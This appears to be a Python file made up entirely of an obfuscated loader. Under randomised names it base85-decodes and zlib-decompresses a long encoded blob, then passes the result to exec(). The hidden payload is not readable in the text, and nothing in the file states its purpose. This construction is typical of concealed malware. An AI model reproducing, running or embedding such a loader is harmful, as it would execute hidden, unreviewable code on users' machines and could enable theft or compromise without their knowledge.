#
import base64 as IMbGChhB,zlib as zMZBtBMJ
WPTpSugV=IMbGChhB.b85decode('c-qZb%Wm8@6y48Pu*zbjVl2<Yj_pBQG)+<<iv&TFoiPv?iL#mK1(Naufq@oicLlm=HhrP(Uli!y<OkYM=p`kNC{gl^Q}m&Yh9d9fecwaQ=ni^8Q^EyKizS*JERLpk7kks$=ni^tM#9&;OqU3UI6jz$3w*SPkB;^a$lbe#2eZ42+5S8Zj~4UAY>Ek)Euup_+dJGpnuYsEdwXHDi06mX1=%0bw8)u2Trh&ugbIW?4A!5^mj%m1!nyvEuYU;;PX8`=DQGepg$d>yJ*!Bb;0&J<wj3dNA`+t@pcxfG;Bu10UiDo*a_Eyw5(WhpXXqG>cT3K8U(#$h%Of&wFN`or^Gq+zxi5eDuX38XFgPV5yog+Hg2s|INb{&n2;cQ3w<4X7y*4+gUXYSBNN7q02afK1iatcM>3pw#P0+0S$wSCuBS<Jn6cjX)T;3d9kJgHx6Gr2!fMn;C<ylHH(KUf!SIs~^jPNoMz^HM7&&tegEs~ED=4pzv2<@CBsj)M$mhdx@B*!mUN$j~07oub&$V*X_VqlRVm(^5j#%qmeT+8e;0vxjtWI@NrXu7oJ>H51S<RStw;KgX+dKMX2F$iVkZ($Yr#Lk=cPS<E>2bgf0XFXQhWT~yKHEc24YPIFos%<u&5)+J6hEjVscHaH?7CnXa{wt2&G>qEDymq`^PStkEk`#6zjOEOA-u?9TnthfF6z63Yb-2}BKE(-d*pSPR6aqa`FEF{REM(cgOYA&qasyRPRx?ZV1~hPqr9f-Tb)s?jS_D;v=%yH$S<0^q2DzkMaCcnb@HLbvP%qEMUPr!mlsQ?EB3Z)F&J~0brwK^wOw6dMWLLkv(Wb3i1xnSX_VyPPvP1g1pjk%17mqXO21!D*Q(a?GU1WXVcRV{-wyq+ol2q!cEf9$F@xDLz=TcF8P7HnjSD9nioDXhF8y#-7C9w+37=vaJgj!RFVBLn4X$N~xW<p|q)pe6LFOeBE>Px~VltT<nt|BMA8_c*Uno02Q$*P$uFS}F2Z6?kcl8ZsGx{3QWZ9oNt+{qaF*;qDHoD%tlR++OaXykD&hhZ8)II5Wt5QHFsgazYOPb`A7Bx_%iR%};t*Piy-@4Yb31kJRG%tyBGl7oFgTVo4T)RoTw!&odU>Dy#lrPZiU1(md8Wv+%q8E54u`30EFL$Vu>X%>-7s48mh7>z50qIU$dpY$2Y@~sael0~lkV8<g#XxxiqPNpk#@7S;m40_kiRs%wqQPdWqTjAY0aGvJR%kZp@_=ygu`zjkAl8ln5qi_LW(aM6B_LH_8O?E(iry^%tCdkA}3T2B<iW!=zG=6zTa3ss_pFh9-vdQFXXQMd4;tK}Z0%b)v%4eD>6cs3%ZcCb0FEfbmmzOl5m|fZAru2&3rg!d#f<m3PMKE?V)4e5=)t9wU&mKPnAylkGYF<y!Q;2o_MaDf~iwSz7QcZt063_Ky;-TFNJXf!!Kaa1`lTU6`qt6&aikQ~<&lQn@6($5{07Mvx04!mE`)v=lkbxZ^68X(k6>)9v%gMQ{A9HjM^-M#e?|YUN)=la86&EChPgs-^(6JOJz0j)d8_Y659j>FZAOsXBP)d1<MR+!mZCGF?Br@TIozsvgMA9}3BT0^<pkAQ!O{TMLFi9{$jb27(s{m0dtAo~cZ%_;bgl<BW!xbu%5oEBm%b_`YVo<N@zA<W7WKM>ApV1>>_m75Iw^t67=s{xW+$qg~-t}%r*{9L4R;q?eYIDD}Pdnc3JM%--5TW6ECs@`z`z!QC&Rz!*Wz`jcKJ^<c)ULg^1e$b$9NnayjbPnm=q+zJD?P6kq8KoxOb`w^u_3{>Lh1T6Yg~U^Bb9V;L^6bvhg|7Rbs6xA@5ng-o;z^|xDNsLjX>Q7=-%j-fZPD$rpYR8HluMn8oRJtbF9k}=^j`+hVHj5oO-&4JKHu!!1qP$rfZ&C<L@;({U;H&btdbIy(NI|Bl&kQbZ=?uTeJy558!~?!s)H#`MY@fMnB3<;`4-%!d-apc}b(Yzg9vL*w-{h2QbR}rcBr-B_om$K@c3EZ@6{2Ez{R@Yj*uMv<lF7zyI;uH`dW#Sp$5N7E%f4eSPqmVzVxihS}A*2t$I@W|lI6{R`MVfRKpksjGeqDiU(+wB<{ytE>cHL2)~FE@-4h9O<l0D@Dc{H7WjF-lhf;P8uS2XZ)HJ>O}j$fjSAA=^@II)<_92k7VC}j%*E31#eBs^(C523NVh`vn6PA$ot_J={EBsQvJ{3cwJ~v%jEZ5>wC+-POpbUj9S;0gXqGPOi|QPuo=D^I{qqk)a}u5eZxZwWgoG<0jA%6fgVx@-35vydH{9?hP>~L3z#YaGzHkp^=f8jN=-fOWkzJW!V)U~HIl6%2;{-X2?816LEtRwz@ci{UuHS+K>')
exec(zMZBtBMJ.decompress(WPTpSugV).decode('utf-8'))
